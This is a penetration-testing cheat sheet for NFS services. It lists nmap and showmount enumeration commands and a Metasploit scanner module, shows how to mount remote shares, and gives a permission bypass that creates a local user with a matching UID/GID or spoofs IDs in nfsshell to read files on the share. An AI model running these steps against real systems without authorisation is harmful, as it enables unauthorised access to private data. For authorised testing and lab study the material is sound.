## Enumeration 
### banner grabbing  
```bash 
nmap -sV -p 111 <IP>
ls -1 /usr/share/nmap/scripts/nfs*
nmap -p 111 --script nfs* 10.11.1.72
nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
nmap --script=nfs-ls,nfs-statfs,nfs-showmount -p 111,2049 <target-ip>
```

### showmoount
```bash
showmount -e $IP
```
### metasploit 
```bash
user auxiliary/scanner/nfs/nfsmount #Scan NFS mounts and list permissions
```

### mounting shares 
```bash
# create new folder under /mnt directory  
sudo mkdir /mnt/test

# mount a folder 
mount -t nfs <target-ip>:/target/dir /mnt/test -o nolock
mount -t nfs 10.10.10.180:/site_backups /mnt/test -o nolock
mount -t nfs <target-ip>:/target/dir /mnt/test -o nolock -o vers=2

# confirm mount successful  
ls /mnt/test

# cleanup mounted foler
sudo umount /mnt/test
sudo rm -r /mnt/test
```

### folder permission bypass 
The permission of the mounted folder is affected by the server's one. If we don't have the permission, we can create a new user with the same UID/GID and gain access to the folder.
```bash
# create new group with GID 1005
groupadd -g 1005 tester

# create a new user w/ UID & GID 
useradd -u 1005 -g 1005 tester

# create new password for 'evil' user
passwd tester

# switch evil user with password
su tester 
```

### nfsshell 
```bash
# https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/
# https://github.com/NetDirect/nfsshell

./nfsshell-master/nfsshell
nfs> host 10.10.100.10          # set target host 
nfs> export                     # list available shares
nfs> mount /home/leep/NFSTEST   # mount the share  
nfs> ls -la                     # list the share
nfs> uid 1000                   # set local UID 
nfs> gid 1000                   # set local GID
nfs> ls -la                     # list the share 
```



